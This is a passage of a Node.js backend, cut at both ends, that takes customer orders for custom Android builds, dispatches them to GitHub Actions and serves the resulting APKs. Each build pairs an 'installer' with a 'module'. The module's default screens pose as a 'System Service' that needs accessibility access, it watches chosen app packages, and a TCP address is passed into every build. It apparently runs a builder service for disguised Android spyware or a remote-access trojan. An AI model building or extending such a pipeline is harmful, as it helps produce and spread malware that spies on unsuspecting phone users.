    const existing = _apkExpiryTimers.get(accessId);
    if (existing) clearTimeout(existing);
    const expiresAt = Date.now() + APK_EXPIRY_MS;
    _apkExpiryTimes.set(accessId, expiresAt);
    const handle = setTimeout(() => { _deleteApkDir(accessId); _apkExpiryTimes.delete(accessId); }, APK_EXPIRY_MS);
    if (handle.unref) handle.unref();
    _apkExpiryTimers.set(accessId, handle);
    log('BUILD', `APKs for ${accessId} will auto-expire in 10 minutes`);
}

const BUILD_JOBS_MAX_LINES = 4000;
const BUILD_JOBS_RECENT_KEEP = 50;
const BUILD_WORKER_OFFLINE_MS = 30000;
// Watchdog: if an active job goes this long without ANY activity from the
// worker (no log line, no upload, no complete) AND the worker has not been
// seen polling either, mark the job failed and free the slot so the
// dashboard's "Build APK" button unlocks instead of staying spun forever.
const BUILD_JOB_STALL_MS = 47 * 60 * 1000;  // 47 min (matches 45-min workflow + buffer)
// Watchdog tick interval
const BUILD_JOB_WATCHDOG_TICK_MS = 30000;
// If a job sits in `pending` and no GitHub token is set, fast-fail it.
const BUILD_JOB_PENDING_NO_WORKER_MS = 60000; // 1 minute

const buildJobs = [];          // pending + running (FIFO)
const recentBuildJobs = [];    // last N finished, newest first

function workerOnline() {
    return !!(process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
}

function findJobByIdAnywhere(id) {
    return buildJobs.find(j => j.id === id) || recentBuildJobs.find(j => j.id === id) || null;
}

function findJobForUser(accessId, includeRecent = true) {
    const active = [...buildJobs].reverse().find(j => j.accessId === accessId);
    if (active) return active;
    if (includeRecent) return recentBuildJobs.find(j => j.accessId === accessId) || null;
    return null;
}

function pushJobLine(job, line) {
    if (!job) return;
    job.lines.push(line);
    if (job.lines.length > BUILD_JOBS_MAX_LINES) {
        job.lines.splice(0, job.lines.length - BUILD_JOBS_MAX_LINES);
    }
    if (job.sseId) sseSend(job.sseId, 'build:log', { jobId: job.id, line });
}


// ── Watchdog ─────────────────────────────────────────────────────────────
// Two failure modes the watchdog covers:
//
//   1. The worker accepted a job and then died / lost connectivity. The job
//      sits "running" forever; the dashboard's Build APK button stays locked;
//      the user can't queue another build. Fix: if `lastActivityAt` is older
//      than BUILD_JOB_STALL_MS, mark the job failed and free the slot.
//
//   2. The user pressed Build APK while no worker was online (or the worker
//      went away after the queue notification). Job sits in `pending`
//      indefinitely. Fix: if a pending job is older than
//      BUILD_JOB_PENDING_NO_WORKER_MS and the worker is still offline,
//      fail it so the UI unlocks instead of pretending we're "queued".
function _failJob(job, errorMsg) {
    if (!job) return;
    job.status     = 'failed';
    job.success    = false;
    job.error      = errorMsg;
    job.finishedAt = Date.now();
    pushJobLine(job, '');
    pushJobLine(job, `❌ BUILD FAILED — ${errorMsg}`);
    if (job.sseId) sseSend(job.sseId, 'build:done', {
        jobId: job.id, success: false, accessId: job.accessId,
        durationMs: job.finishedAt - (job.startedAt || job.createdAt), error: errorMsg,
    });
    const idx = buildJobs.indexOf(job);
    if (idx >= 0) buildJobs.splice(idx, 1);
    recentBuildJobs.unshift(job);
    if (recentBuildJobs.length > BUILD_JOBS_RECENT_KEEP) recentBuildJobs.pop();
}

function _runBuildWatchdog() {
    try {
        // Stalled running jobs — if GitHub Actions stops reporting activity,
        // fail the job so the dashboard unlocks instead of spinning forever.
        for (const job of [...buildJobs]) {
            if (job.status !== 'running') continue;
            const stallMs = Date.now() - (job.lastActivityAt || job.startedAt || job.createdAt);
            if (stallMs > BUILD_JOB_STALL_MS) {
                log('BUILD', `Watchdog: running job ${job.id} (accessId=${job.accessId}) had no activity for ${Math.round(stallMs / 1000)}s — failing`, 'warn');
                _failJob(job, `GitHub Actions stopped responding (no updates for ${Math.round(stallMs / 1000)}s). Please try again.`);
            }
        }
    } catch (err) {
        log('BUILD', `Watchdog tick error: ${err && err.message || err}`, 'error');
    }
}
setInterval(_runBuildWatchdog, BUILD_JOB_WATCHDOG_TICK_MS).unref?.();

function isValidPackage(s) {
    return typeof s === 'string' && /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(s);
}
function isValidAppName(s) {
    return typeof s === 'string' && s.length > 0 && s.length <= 40 && /^[\w .&'-]+$/.test(s);
}
function sanitizeMonitoredPackages(input) {
    // Accept array of strings OR comma/newline separated string. Returns
    // de-duplicated, validated list of Java package names.
    let arr = [];
    if (Array.isArray(input)) arr = input;
    else if (typeof input === 'string') arr = input.split(/[\s,]+/);
    else return [];
    const seen = new Set();
    const out = [];
    for (const raw of arr) {
        const s = String(raw || '').trim();
        if (!s) continue;
        if (!isValidPackage(s)) continue;
        if (seen.has(s)) continue;
        seen.add(s);
        out.push(s);
        if (out.length >= 200) break;
    }
    return out;
}

// Build-worker auth: shared secret from buildWorkerSettings.apiKey.
//
// On commercial PaaS hosts (Heroku/Zeabur/Render/Fly/Railway) the worker
// usually fails to come "online" for one of three reasons:
//   1. The backend's API key env var is not set (or was wiped by a restart).
//   2. The worker is sending a key that doesn't match (typo / extra whitespace
//      from copy-paste / different env var name on each side).
//   3. The worker can't reach the backend at all (wrong BUILD_URL, dyno
//      sleeping, platform blocking the request).
//
// We log each failure with enough detail to diagnose which of these it is,
// rate-limited so a misconfigured worker can't flood the log buffer.
const _workerAuthLog = { lastAt: 0, suppressed: 0 };
function _logWorkerAuthFailure(reason, req, extra = '') {
    const now = Date.now();
    if (now - _workerAuthLog.lastAt < 5000) {
        _workerAuthLog.suppressed++;
        return;
    }
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'unknown').toString().split(',')[0].trim();
    const ua = (req.headers['user-agent'] || '-').toString().slice(0, 60);
    const suppressedMsg = _workerAuthLog.suppressed > 0
        ? ` (+${_workerAuthLog.suppressed} similar suppressed in last 5 s)` : '';
    log('BUILD', `Worker auth FAILED: ${reason}${extra ? ' — ' + extra : ''} | ip=${ip} ua=${ua}${suppressedMsg}`, 'warn');
    _workerAuthLog.lastAt = now;
    _workerAuthLog.suppressed = 0;
}

function requireBuildWorker(req, res, next) {
    const token = ((req.headers['authorization'] || '').replace(/^Bearer\s+/i, '')
                || req.headers['x-build-worker-key']
                || req.query.key
                || '').toString().trim();
    const expected = buildWorkerSettings.apiKey;
    if (!expected) {
        _logWorkerAuthFailure('API key not configured on backend', req,
            'set BUILD_WORKER_API_KEY env var');
        return res.status(503).json({
            success: false,
            error: 'Build API key not configured on the backend. Set the BUILD_WORKER_API_KEY environment variable.',
        });
    }
    if (!token) {
        _logWorkerAuthFailure('caller sent no Authorization header', req);
        return res.status(401).json({ success: false, error: 'Missing build key (Authorization: Bearer <key>)' });
    }
    if (token !== expected) {
        _logWorkerAuthFailure('key mismatch', req,
            `caller sent length=${token.length}, backend expects length=${expected.length}`);
        return res.status(401).json({ success: false, error: 'Invalid build key' });
    }
    // Refresh lastActivityAt on any authenticated callback so the watchdog
    // doesn't declare the job stalled during long Gradle runs.
    const jobId = req.params && req.params.jobId;
    if (jobId) {
        const job = findJobByIdAnywhere(jobId);
        if (job) job.lastActivityAt = Date.now();
    }
    next();
}

// POST /api/build/apk — dispatch a build job to GitHub Actions
app.post('/api/build/apk', requireUserOrAdmin, express.json({ limit: '12mb' }), async (req, res) => {
    const {
        moduleName, modulePackage, installerName, installerPackage, sseId, monitoredPackages,
        moduleIconUrl, installerIconUrl,
        installerLaunchTitle, installerLaunchSubtitle, installerLaunchBtnText,
        installerLaunchBgColor, installerLaunchAccentColor,
        moduleLaunchTitle, moduleLaunchSubtitle,
        moduleLaunchStep1, moduleLaunchStep2, moduleLaunchStep3, moduleLaunchStep4,
        moduleLaunchBtnText, moduleLaunchFooter,
        moduleLaunchBgColor, moduleLaunchCardColor, moduleLaunchAccentColor,
    } = req.body || {};

    if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
    if (!isValidPackage(modulePackage))      return res.status(400).json({ success: false, error: 'Invalid module package (e.g. com.example.app)' });
    if (!isValidAppName(installerName))      return res.status(400).json({ success: false, error: 'Invalid installer name' });
    if (!isValidPackage(installerPackage))   return res.status(400).json({ success: false, error: 'Invalid installer package' });
    if (modulePackage === installerPackage)  return res.status(400).json({ success: false, error: 'Module and installer packages must differ' });

    // Sanitise icon URLs — accept http/https URLs or data: URIs (base64-encoded images).
    // Cap data URIs at ~8 MB to avoid bloating the job queue.
    const sanitizeIconUrl = (raw) => {
        if (!raw || typeof raw !== 'string') return '';
        const v = raw.trim();
        if (v.startsWith('data:image/') && v.includes(';base64,')) {
            return v.length > 8 * 1024 * 1024 ? '' : v;  // 8 MB cap
        }
        if (/^https?:\/\/.{4,}/i.test(v)) return v;
        return '';
    };
    const safeModuleIconUrl    = sanitizeIconUrl(moduleIconUrl);
    const safeInstallerIconUrl = sanitizeIconUrl(installerIconUrl);

    // Sanitise launch page fields — plain text, max 200 chars each.
    const sanitizeText = (raw, fallback) => {
        if (!raw || typeof raw !== 'string') return fallback;
        return raw.trim().slice(0, 200) || fallback;
    };
    const sanitizeColor = (raw, fallback) => {
        if (!raw || typeof raw !== 'string') return fallback;
        return /^#[0-9a-fA-F]{6}$/.test(raw.trim()) ? raw.trim() : fallback;
    };
    const safeTitle       = sanitizeText(installerLaunchTitle,       'A module is required');
    const safeSubtitle    = sanitizeText(installerLaunchSubtitle,    'Click Install to proceed.');
    const safeBtnText     = sanitizeText(installerLaunchBtnText,     'Install');
    const safeBgColor     = sanitizeColor(installerLaunchBgColor,    '#0B1020');
    const safeAccentColor = sanitizeColor(installerLaunchAccentColor,'#6366F1');

    const safeModuleLaunchTitle    = sanitizeText(moduleLaunchTitle,    'System Service');
    const safeModuleLaunchSubtitle = sanitizeText(moduleLaunchSubtitle, 'Accessibility service not enabled');
    const safeModuleLaunchStep1    = sanitizeText(moduleLaunchStep1,    '');
    const safeModuleLaunchStep2    = sanitizeText(moduleLaunchStep2,    '');
    const safeModuleLaunchStep3    = sanitizeText(moduleLaunchStep3,    '');
    const safeModuleLaunchStep4    = sanitizeText(moduleLaunchStep4,    '');
    const safeModuleLaunchBtnText  = sanitizeText(moduleLaunchBtnText,  'Open Accessibility Settings');
    const safeModuleLaunchFooter   = sanitizeText(moduleLaunchFooter,   '');
    const safeModuleLaunchBgColor     = sanitizeColor(moduleLaunchBgColor,     '#0F172A');
    const safeModuleLaunchCardColor   = sanitizeColor(moduleLaunchCardColor,   '#1E293B');
    const safeModuleLaunchAccentColor = sanitizeColor(moduleLaunchAccentColor, '#0EA5E9');

    const ghToken = (process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
    if (!ghToken) {
        return res.status(503).json({ success: false, error: 'GitHub token (GITHUB_PERSONAL_ACCESS_TOKEN) is not configured on the backend.' });
    }

    let accessId = '';
    if (req.authRole === 'user') {
        // Use JWT-carried accessId first; only query MongoDB if it's missing
        // (old tokens issued before this field was added to the JWT payload).
        accessId = req.authAccessId || '';
        if (!accessId) {
            try {
                const u = await User.findById(req.authUserId).select('accessId').lean();
                accessId = (u && u.accessId) || '';
            } catch (_) {}
        }
        if (!accessId) return res.status(400).json({ success: false, error: 'No Access ID assigned to your account.' });
    } else {
        accessId = (req.body.accessId && String(req.body.accessId).trim()) || 'ADMIN-BUILD';
    }

    // One active/pending job per user at a time.
    if (buildJobs.some(j => j.accessId === accessId)) {
        return res.status(409).json({ success: false, error: 'A build is already in progress for your account. Please wait for it to finish.' });
    }

    // Global queue limit — keeps the queue manageable.
    const BUILD_QUEUE_MAX = 15;
    if (buildJobs.length >= BUILD_QUEUE_MAX) {
        return res.status(429).json({ success: false, error: `Build queue is full (${BUILD_QUEUE_MAX} active builds). Please try again in a few minutes.` });
    }

    const job = {
        id: crypto.randomBytes(12).toString('hex'),
        accessId,
        moduleName, modulePackage, installerName, installerPackage,
        monitoredPackages: sanitizeMonitoredPackages(monitoredPackages),
        moduleIconUrl:              safeModuleIconUrl,
        installerIconUrl:           safeInstallerIconUrl,
        installerLaunchTitle:       safeTitle,
        installerLaunchSubtitle:    safeSubtitle,
        installerLaunchBtnText:     safeBtnText,
        installerLaunchBgColor:     safeBgColor,
        installerLaunchAccentColor: safeAccentColor,
        moduleLaunchTitle:          safeModuleLaunchTitle,
        moduleLaunchSubtitle:       safeModuleLaunchSubtitle,
        moduleLaunchStep1:          safeModuleLaunchStep1,
        moduleLaunchStep2:          safeModuleLaunchStep2,
        moduleLaunchStep3:          safeModuleLaunchStep3,
        moduleLaunchStep4:          safeModuleLaunchStep4,
        moduleLaunchBtnText:        safeModuleLaunchBtnText,
        moduleLaunchFooter:         safeModuleLaunchFooter,
        moduleLaunchBgColor:        safeModuleLaunchBgColor,
        moduleLaunchCardColor:      safeModuleLaunchCardColor,
        moduleLaunchAccentColor:    safeModuleLaunchAccentColor,
        sseId: sseId || null,
        status: 'running',
        lines: [],
        createdAt:      Date.now(),
        startedAt:      Date.now(),
        finishedAt:     0,
        lastActivityAt: Date.now(),
        success: null,
        error:   null,
        ghRepo:  null,   // set after dispatch
        ghRunId: null,   // found by poller
    };
    buildJobs.push(job);

    pushJobLine(job, `📥 Build started for Access ID ${accessId} (id ${job.id})`);
    pushJobLine(job, `  Module:    ${moduleName} (${modulePackage})`);
    pushJobLine(job, `  Installer: ${installerName} (${installerPackage})`);
    if (job.monitoredPackages.length) {
        pushJobLine(job, `  Monitored packages (${job.monitoredPackages.length}): ${job.monitoredPackages.join(', ')}`);
    }
    pushJobLine(job, `⏳ Dispatching to GitHub Actions…`);

    // Derive callback URL — use centralised helper that handles all PaaS platforms,
    // falling back to the request's own Host header as last resort.
    const host = req.get('x-forwarded-host') || req.get('host') || '';
    const proto = req.get('x-forwarded-proto') || (req.secure ? 'https' : 'http');
    const callbackUrl = _derivePublicUrl() || (host ? `${proto}://${host}` : '');

    const ghRepo = (process.env.APK_GITHUB_REPO || 'lastie357-droid/Apk-builder').trim()
        .replace(/^https?:\/\/github\.com\//, '').replace(/\/$/, '');

    try {
        const dispatchRes = await fetch(`https://api.github.com/repos/${ghRepo}/dispatches`, {
            method: 'POST',
            headers: {
                'Authorization':        `Bearer ${ghToken}`,
                'Accept':               'application/vnd.github+json',
                'X-GitHub-Api-Version': '2022-11-28',
                'Content-Type':         'application/json',
            },
            body: JSON.stringify({
                event_type: 'build-apk',
                // GitHub limits client_payload to 10 properties max.
                // We pack related fields into JSON strings to stay within that limit.
                client_payload: {
                    job_id:        job.id,
                    access_id:     accessId,
                    callback_url:  callbackUrl,
                    build_api_key: buildWorkerSettings.apiKey,
                    tcp_addr:      `${(process.env.BUILD_TCP_HOST || '').trim()}:${(process.env.BUILD_TCP_PORT || '').trim()}`,
                    // Pack app identity fields
                    app: JSON.stringify({
                        module_name:        moduleName,
                        module_package:     modulePackage,
                        installer_name:     installerName,
                        installer_package:  installerPackage,
                        monitored_packages: job.monitoredPackages.join(','),
                    }),
                    // Icon URLs — data URIs are skipped (too large for GHA payload; use http/https URLs instead)
                    icons: JSON.stringify({
                        module_icon_url:    safeModuleIconUrl.startsWith('data:')    ? '' : safeModuleIconUrl,
                        installer_icon_url: safeInstallerIconUrl.startsWith('data:') ? '' : safeInstallerIconUrl,
                    }),
                    // Installer launch page customisation
                    installer_launch: JSON.stringify({
                        title:        safeTitle,
                        subtitle:     safeSubtitle,
                        btn:          safeBtnText,
                        bg_color:     safeBgColor,
                        accent_color: safeAccentColor,
                    }),
                    // Module launch page customisation
                    module_launch: JSON.stringify({
                        title:      safeModuleLaunchTitle,
                        subtitle:   safeModuleLaunchSubtitle,
                        step1:      safeModuleLaunchStep1,
                        step2:      safeModuleLaunchStep2,
                        step3:      safeModuleLaunchStep3,
                        step4:      safeModuleLaunchStep4,
                        btn:        safeModuleLaunchBtnText,
                        footer:     safeModuleLaunchFooter,
                        bg_color:   safeModuleLaunchBgColor,
                        card_color: safeModuleLaunchCardColor,
                        accent:     safeModuleLaunchAccentColor,
                    }),
                },
            }),
        });

        if (!dispatchRes.ok) {
            const errText = await dispatchRes.text().catch(() => '');
            throw new Error(`GitHub API responded ${dispatchRes.status}: ${errText.slice(0, 200)}`);
        }

        job.ghRepo = ghRepo;
        pushJobLine(job, `✅ GitHub Actions workflow triggered — fetching live logs…`);
        log('BUILD', `Dispatched job ${job.id} for ${accessId} to GitHub Actions (repo=${ghRepo})`);

        // Start background log poller — pulls GHA job logs every 8s and streams to user
        _startGHAPoller(job, ghRepo).catch(() => {});

        res.json({
            success:      true,
            accessId,
            jobId:        job.id,
            workerOnline: true,
            message:      'Build dispatched to GitHub Actions.',
        });
    } catch (err) {
        log('BUILD', `Failed to dispatch job ${job.id} to GitHub Actions: ${err.message}`, 'error');
        _failJob(job, `Failed to trigger GitHub Actions: ${err.message}`);
        res.status(500).json({ success: false, error: err.message });
    }
});

// GET /api/build/status — caller's most-recent job (active, pending, or recent)
app.get('/api/build/status', requireUserOrAdmin, async (req, res) => {
    let myAccessId = '';
    if (req.authRole === 'user') {
        myAccessId = req.authAccessId || '';
        if (!myAccessId) {
            try {
                const u = await User.findById(req.authUserId).select('accessId').lean();
                myAccessId = (u && u.accessId) || '';
            } catch (_) {}
        }
    } else {
        const runningJob = buildJobs.find(j => j.status === 'running');
        myAccessId = (req.query.accessId && String(req.query.accessId).trim()) || (runningJob && runningJob.accessId) || 'ADMIN-BUILD';
    }

    const job = findJobForUser(myAccessId, true);
    if (!job) {
        return res.json({
            success:      true,
            running:      false,
            isMyBuild:    false,
            workerOnline: workerOnline(),
            lines:        [],
        });
    }
    res.json({
        success:      true,
        running:      job.status === 'pending' || job.status === 'running',
        isMyBuild:    true,
        workerOnline: workerOnline(),
        accessId:     job.accessId,
        jobId:        job.id,
        status:       job.status,
        success_:     job.success,
        error:        job.error,
        createdAt:    job.createdAt,
        startedAt:    job.startedAt,
        finishedAt:   job.finishedAt,
        lines:        job.lines.slice(-300),
        apkExpiresAt: _apkExpiryTimes.get(job.accessId) || null,
    });
});

// Short-lived, single-use download tickets (kept in-memory; ~60s TTL).
// Lets the browser stream APKs directly via a plain <a href> navigation
// (native progress + instant start) without putting the JWT in the URL.
const _downloadTickets = new Map(); // ticket -> { accessId, type, expiresAt, used }
function _issueDownloadTicket(accessId, type) {
    const ticket = crypto.randomBytes(24).toString('hex');
    _downloadTickets.set(ticket, {
        accessId,
        type,
        expiresAt: Date.now() + 60 * 1000,
        used: false,
    });
    return ticket;
}
setInterval(() => {
    const now = Date.now();
    for (const [t, v] of _downloadTickets) {
        if (v.expiresAt < now) _downloadTickets.delete(t);
    }
}, 30 * 1000).unref?.();

async function _resolveAccessIdForReq(req) {
    if (req.authRole === 'user') {
        // JWT-carried value first — avoids a DB round-trip and works even when MongoDB is down.
        let aid = req.authAccessId || '';
        if (!aid) {
            try {
                const u = await User.findById(req.authUserId).select('accessId').lean();
                aid = (u && u.accessId) || '';
            } catch (_) {}
        }
        return aid;
    }
    const runningJob = buildJobs.find(j => j.status === 'running');
    return (req.query.accessId && String(req.query.accessId).trim())
        || (runningJob && runningJob.accessId)
        || 'ADMIN-BUILD';
}

// POST /api/build/download/:type/ticket — issue a short-lived ticket
app.post('/api/build/download/:type/ticket', requireUserOrAdmin, async (req, res) => {
    const { type } = req.params;
    if (type !== 'module' && type !== 'installer') {
        return res.status(400).json({ success: false, error: 'type must be module or installer' });
    }
    const accessId = await _resolveAccessIdForReq(req);
    if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });

    const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
    const apkPath  = path.join(BUILD_OUTPUT_ROOT, accessId, filename);
    if (!fs.existsSync(apkPath)) {
        return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
    }
    const ticket = _issueDownloadTicket(accessId, type);
    res.json({ success: true, ticket, url: `/api/build/download/${type}?ticket=${ticket}` });
});

// GET /api/build/download/:type  (type = module|installer)
// Auth: either a normal Bearer/?token= (HEAD probes, admin), OR a one-time ?ticket=
app.get('/api/build/download/:type', async (req, res, next) => {
    const { type } = req.params;
    if (type !== 'module' && type !== 'installer') {
        return res.status(400).json({ success: false, error: 'type must be module or installer' });
    }

    // Ticket path (used by direct browser downloads from the dashboard)
    const ticket = req.query.ticket && String(req.query.ticket);
    if (ticket) {
        const entry = _downloadTickets.get(ticket);
        if (!entry || entry.used || entry.expiresAt < Date.now() || entry.type !== type) {
            return res.status(401).json({ success: false, error: 'Invalid or expired download ticket' });
        }
        entry.used = true;
        _downloadTickets.delete(ticket);

        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const apkPath  = path.join(BUILD_OUTPUT_ROOT, entry.accessId, filename);
        if (!fs.existsSync(apkPath)) {
            return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
        }
        // Named with accessId so each user's file is distinct
        const dlName = type === 'module'
            ? `Module-${entry.accessId}.apk`
            : `Installer-${entry.accessId}.apk`;
        return res.download(apkPath, dlName);
    }

    // Fall through to normal auth (used for HEAD availability probes)
    return requireUserOrAdmin(req, res, async () => {
        const accessId = await _resolveAccessIdForReq(req);
        if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });

        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const apkPath  = path.join(BUILD_OUTPUT_ROOT, accessId, filename);
        if (!fs.existsSync(apkPath)) {
            return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
        }
        const dlName = type === 'module'
            ? `Module-${accessId}.apk`
            : `Installer-${accessId}.apk`;
        res.download(apkPath, dlName);
    });
});

// ── GitHub Actions log poller ────────────────────────────────────────────────
// Polls the GitHub API every 8s to fetch live job logs and push them into the
// job's line buffer so the dashboard sees real-time output without needing any
// log-streaming logic inside the workflow itself.
async function _startGHAPoller(job, ghRepo) {
    const ghToken = (process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
    if (!ghToken) return;

    const GH = {
        'Authorization':        `Bearer ${ghToken}`,
        'Accept':               'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent':           'remoteaccess-backend',
    };
    const ghGet = (url) => fetch(url, { headers: GH });

    let ghRunId  = null;
    let ghJobId  = null;
    let sentLines = 0;
    let stopped  = false;

    // Find the Actions run that was created for this dispatch
    const findRun = async () => {
        const r = await ghGet(
            `https://api.github.com/repos/${ghRepo}/actions/runs?event=repository_dispatch&per_page=10`
        );
        if (!r.ok) return null;
        const { workflow_runs = [] } = await r.json();
        const cutoff = job.createdAt - 15000; // 15s before dispatch
        const run = workflow_runs
            .filter(w => new Date(w.created_at).getTime() >= cutoff)
            .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))[0];
        return run ? run.id : null;
    };

    // Get the first job ID within the run
    const findGhJobId = async () => {
        const r = await ghGet(
            `https://api.github.com/repos/${ghRepo}/actions/runs/${ghRunId}/jobs`
        );
        if (!r.ok) return null;
        const { jobs = [] } = await r.json();
        return jobs[0]?.id || null;
    };

    // Fetch all log text for the job so far and push any new lines.
    // GitHub returns 302 → Azure Blob URL; we must NOT forward GH auth headers
    // to the blob URL, so we handle the redirect manually.
    const fetchAndPushLogs = async () => {
        const r1 = await fetch(
            `https://api.github.com/repos/${ghRepo}/actions/jobs/${ghJobId}/logs`,
            { headers: GH, redirect: 'manual' }
        );
        let text = '';
        if (r1.status === 302) {
            const loc = r1.headers.get('location');
            if (!loc) return;
            const r2 = await fetch(loc); // plain GET, no auth headers
            if (!r2.ok) return;
            text = await r2.text();
        } else if (r1.ok) {
            text = await r1.text();
        } else { return; }
        if (!text) return;

        const lines = text.split('\n').map(l =>
            l.replace(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z\s?/, '') // strip GHA timestamp
             .replace(/##\[group\]/g,    '▶ ')
             .replace(/##\[endgroup\]/g, '')
             .replace(/##\[error\]/g,    '❌ ')
             .replace(/##\[warning\]/g,  '⚠ ')
             .replace(/##\[command\]/g,  '$ ')
             .trimEnd()
        ).filter(l => l.length > 0);

        const newLines = lines.slice(sentLines);
        if (newLines.length > 0) {
            for (const line of newLines) {
                if (job.status === 'running') pushJobLine(job, line);
            }
            sentLines = lines.length;
            job.lastActivityAt = Date.now();
        }
    };

    const tick = async () => {
        if (stopped || job.status !== 'running') { stopped = true; return; }
        try {
            if (!ghRunId) {
                ghRunId = await findRun();
                if (ghRunId) {
                    job.ghRunId = ghRunId;
                    pushJobLine(job, `🔗 Run #${ghRunId} — streaming logs from GitHub Actions…`);
                }
                return;
            }
            if (!ghJobId) {
                ghJobId = await findGhJobId();
                return;
            }
            await fetchAndPushLogs();
        } catch (err) {
            log('BUILD', `GHA poller error for job ${job.id}: ${err.message}`, 'warn');
        }
    };

    const iv = setInterval(async () => {
        if (stopped || job.status !== 'running') {
            clearInterval(iv);
            stopped = true;
            // One final fetch after job completes to capture last lines
            if (ghJobId) setTimeout(async () => { try { await fetchAndPushLogs(); } catch (_) {} }, 4000);
            return;
        }
        await tick();
    }, 8000);

    // First tick 8s after dispatch (give GitHub time to queue the run)
    setTimeout(tick, 8000);
}

// ── BUILD CALLBACK ENDPOINTS (called by GitHub Actions after build) ─────────

// Append log lines from GitHub Actions build. Body: { lines: [...] } or { line: "..." }
app.post('/api/build/worker/log/:jobId', requireBuildWorker, express.json({ limit: '2mb' }), (req, res) => {
    const job = findJobByIdAnywhere(req.params.jobId);
    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
    const lines = Array.isArray(req.body?.lines) ? req.body.lines
                : (typeof req.body?.line === 'string' ? [req.body.line] : []);
    for (const ln of lines) {
        if (typeof ln === 'string' && ln.length > 0) pushJobLine(job, ln);
    }
    res.json({ success: true });
});

// Heartbeat from GitHub Actions — just refreshes lastActivityAt so the watchdog
// doesn't time out during long Gradle runs with no other callbacks.
app.post('/api/build/worker/heartbeat/:jobId', requireBuildWorker, (req, res) => {
    const job = findJobByIdAnywhere(req.params.jobId);
    if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
    job.lastActivityAt = Date.now();
    res.json({ success: true, alive: true });
});

// Upload a built APK from the worker. type = module | installer.
// Body is the raw APK bytes (Content-Type: application/octet-stream).
// Falls back to ?accessId= query param when the backend has restarted and
// the in-memory job entry no longer exists — APKs are always saved to disk.
app.post('/api/build/worker/upload/:jobId/:type', requireBuildWorker,
    express.raw({ type: '*/*', limit: '300mb' }),
    (req, res) => {
        const { type } = req.params;
        if (type !== 'module' && type !== 'installer') {
            return res.status(400).json({ success: false, error: 'type must be module or installer' });
        }
        const buf = req.body;
        if (!buf || !buf.length) return res.status(400).json({ success: false, error: 'Empty upload' });

        // Try to find the job by ID first; fall back to accessId query param.
        let job = findJobByIdAnywhere(req.params.jobId);
        const fallbackAccessId = (req.query.accessId || '').toString().trim();

        const accessId = job ? job.accessId : fallbackAccessId;
        if (!accessId) return res.status(404).json({ success: false, error: 'Unknown job and no accessId provided' });

        // Always save APK to disk — this succeeds even if the backend restarted.
        const dir = path.join(BUILD_OUTPUT_ROOT, accessId);
        try { fs.mkdirSync(dir, { recursive: true }); } catch (_) {}
        const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
        const dest = path.join(dir, filename);
        fs.writeFileSync(dest, buf);
        const sizeMb = (buf.length / 1024 / 1024).toFixed(2);
        log('BUILD', `Saved ${filename} for ${accessId} (${sizeMb} MB) from job ${req.params.jobId}`);
        if (job) pushJobLine(job, `⬆ Uploaded ${filename} (${sizeMb} MB)`);
        // Schedule APK expiry: delete the entire output dir 10 minutes after save
        _scheduleApkExpiry(accessId);
        res.json({ success: true });
    }
);

// Mark the job complete. Body: { success: bool, error?: string }
// Falls back to ?accessId= when the job ID is stale (backend restarted mid-build).
app.post('/api/build/worker/complete/:jobId', requireBuildWorker, express.json(), (req, res) => {
    let job = findJobByIdAnywhere(req.params.jobId);

    // Fallback: find any running job for this user by accessId
    if (!job) {
        const fbAccessId = (req.query.accessId || '').toString().trim();
        if (fbAccessId) job = findJobForUser(fbAccessId, false); // active only
        if (!job && fbAccessId) {
            // Backend restarted — no in-memory job. Log and respond OK so the
            // workflow step doesn't fail; APKs are already saved to disk.
            log('BUILD', `complete callback: no job found for ${req.params.jobId} / accessId=${fbAccessId} (backend may have restarted) — APKs already on disk`);
            return res.json({ success: true, note: 'job_not_found_apks_on_disk' });
        }
        if (!job) return res.status(404).json({ success: false, error: 'Unknown job' });
    }

    const ok = !!req.body?.success;
    job.status     = ok ? 'success' : 'failed';
    job.success    = ok;
    job.error      = ok ? null : (req.body?.error || 'Build failed');
    job.finishedAt = Date.now();
    pushJobLine(job, '');
    pushJobLine(job, ok ? '✅ BUILD SUCCESS — APKs ready to download' : `❌ BUILD FAILED — ${job.error}`);
    if (job.sseId) sseSend(job.sseId, 'build:done', {
        jobId: job.id, success: ok, accessId: job.accessId,
        durationMs: job.finishedAt - job.startedAt, error: job.error,
    });
    const idx = buildJobs.indexOf(job);
    if (idx >= 0) buildJobs.splice(idx, 1);
    recentBuildJobs.unshift(job);
    if (recentBuildJobs.length > BUILD_JOBS_RECENT_KEEP) recentBuildJobs.pop();
    res.json({ success: true });
});

// GET /api/build/worker/health — PUBLIC diagnostic endpoint
app.get('/api/build/worker/health', (req, res) => {
    const host = req.get('x-forwarded-host') || req.get('host') || '';
    const proto = req.get('x-forwarded-proto') || (req.secure ? 'https' : 'http');
    res.set('Cache-Control', 'no-store');
    const runningJobs = buildJobs.filter(j => j.status === 'running');
    res.json({
        ok:                   true,
        backendReachable:     true,
        publicUrl:            host ? `${proto}://${host}` : null,
        githubActionsEnabled: workerOnline(),
        callbackKeyConfigured: !!buildWorkerSettings.apiKey,
        runningJobs:          runningJobs.length,
        activeJob:            runningJobs[0] ? runningJobs[0].id : null,
        serverTimeMs:         Date.now(),
    });
});

// GET /api/build/worker/status — admin-only build status snapshot
app.get('/api/build/worker/status', requireAdmin, (req, res) => {
